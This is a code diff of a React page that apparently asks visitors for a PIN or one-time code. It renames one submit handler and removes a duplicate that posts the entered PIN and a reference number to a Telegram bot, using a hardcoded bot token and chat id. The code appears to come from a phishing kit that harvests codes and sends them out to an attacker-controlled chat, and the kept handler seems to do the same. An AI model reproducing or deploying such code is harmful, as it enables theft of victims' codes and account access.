@@ -25,7 +25,7 @@ function CodePageContent() {
       setExpired(true);
     }
   }, [timeLeft]);
-const handleSend = async () => {
+const handleSubmit = async () => {
   if (!code) {
       alert("Please fill in all fields");
       return;
@@ -54,29 +54,7 @@ const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
     alert("حدث خطأ أثناء الإرسال");
   }
 };
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (expired) {
-      alert("The code has expired. Please request a new one.");
-      return;
-    }
-    if (code) {
-      
-      try {
-        await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
-          {
-            chat_id: "-4836393174",
-            text: text
-          }
-        );
-        
-      } catch (error) {
-        alert("Error sending data");
-        console.error(error);
-      }
-    }
-  };
+  
 
   const handleResend = () => {
     setResending(true);
